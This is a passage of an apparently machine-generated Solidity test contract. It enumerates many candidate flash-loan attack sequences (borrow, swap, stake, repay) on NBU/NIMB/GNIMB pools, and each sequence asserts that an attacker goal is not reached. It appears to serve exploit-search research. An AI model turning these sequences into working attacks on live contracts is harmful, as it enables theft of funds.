        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3744(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3745(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3746(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3747(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3748(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3749(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3750(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3751(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3752(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3753(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3754(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3755(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3756(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3757(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3758(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3759(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3760(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3761(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3762(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3763(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3764(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3765(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3766(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3767(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3768(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3769(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3770(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3771(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3772(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3773(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3774(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3775(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3776(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3777(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3778(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3779(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3780(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3781(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3782(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3783(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3784(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3785(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3786(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3787(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3788(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3789(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
